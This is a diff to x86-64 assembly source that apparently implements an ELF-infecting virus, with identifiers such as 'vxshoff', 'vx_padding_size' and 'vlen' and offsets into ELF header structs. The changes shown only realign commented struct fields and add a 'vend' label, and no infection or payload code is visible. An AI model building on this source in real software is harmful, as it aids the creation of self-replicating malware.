@@ -167,9 +167,9 @@ BITS 64
 ;		.e_shoff		resq	1		;ElfN_Off, bytes 40-47
 ;		.e_flags		resd	1		;uint32_t, bytes 48-51
 ;		.e_ehsize		resb	2		;uint16_t, bytes 52-53
-;		.e_phentsize	resb	2		;uint16_t, bytes 54-55
+;		.e_phentsize		resb	2		;uint16_t, bytes 54-55
 ;		.e_phnum		resb	2		;uint16_t, bytes 56-57
-;		.e_shentsize	resb	2		;uint16_t, bytes 58-59
+;		.e_shentsize		resb	2		;uint16_t, bytes 58-59
 ;		.e_shnum		resb	2		;uint16_t, bytes 60-61
 ;		.e_shstrndx		resb	2		;uint16_t, bytes 62-63
 ;	endstruc
@@ -194,7 +194,7 @@ BITS 64
 ;     	.sh_size		resq 1		; uint64_t   
 ;     	.sh_link		resd 1		; uint32_t   
 ;     	.sh_info		resd 1		; uint32_t   
-;     	.sh_addralign	resq 1		; uint64_t   
+;     	.sh_addralign		resq 1		; uint64_t   
 ;     	.sh_entsize		resq 1		; uint64_t   
 ;	endstruc
 ;
@@ -252,7 +252,7 @@ BITS 64
 ; r14 + 805			.ei_data		resb	1		;
 ; r14 + 806			.ei_version		resb	1		;
 ; r14 + 807			.ei_osabi		resb	1		;
-; r14 + 808			.ei_abiversion	resb	1		;
+; r14 + 808			.ei_abiversion  resb	1		;
 ; r14 + 809			.ei_padding		resb	6		;bytes9-14
 ; r14 + 815			.ei_nident		resb	1		;sizeofidentarray
 ; r14 + 816			.e_type			resw	1		;uint16_t,bytes16-17
@@ -263,9 +263,9 @@ BITS 64
 ; r14 + 840			.e_shoff		resq	1		;ElfN_Off, bytes 40-47
 ; r14 + 848			.e_flags		resd	1		;uint32_t, bytes 48-51
 ; r14 + 852			.e_ehsize		resb	2		;uint16_t, bytes 52-53
-; r14 + 854			.e_phentsize	resb	2		;uint16_t, bytes 54-55
+; r14 + 854			.e_phentsize    resb	2		;uint16_t, bytes 54-55
 ; r14 + 856			.e_phnum		resb	2		;uint16_t, bytes 56-57
-; r14 + 858			.e_shentsize	resb	2		;uint16_t, bytes 58-59
+; r14 + 858			.e_shentsize		resb	2		;uint16_t, bytes 58-59
 ; r14 + 860			.e_shnum		resb	2		;uint16_t, bytes 60-61
 ; r14 + 862			.e_shstrndx		resb	2		;uint16_t, bytes 62-63
 ; r14 + 864		endstruc
@@ -410,7 +410,8 @@ vxshoff: dd 0
 vx_padding_size: dd 0
 fd:	dq 0
 MAX_RDENT_BUF_SIZE equ 0x800
-
+;%define vlen equ vend - _start
+ 
 global _start
 default rel
 section .text
@@ -1078,6 +1079,7 @@ _restore:
 
 
 vlen equ $-_start
+vend:
 _end:
 	xor rdi, rdi
 	mov rax, 0x3c 				;exit() syscall on x64: SYS_EXIT equ 0x3c
